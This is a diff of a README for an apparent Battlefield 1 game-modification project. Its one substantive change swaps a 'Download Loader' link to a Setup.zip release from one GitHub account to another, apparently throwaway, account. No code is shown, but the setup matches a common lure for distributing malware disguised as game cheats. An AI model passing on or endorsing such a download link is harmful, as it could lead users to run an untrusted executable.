@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Battlefield 1 Route Planner
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Battlefield-1-Route-Planner` · Updated: 2026-10-30
 
 **Tags:** `battlefield-1` `route-planner` `shooter` `campaign` `loadout` `windows` `steam`
+
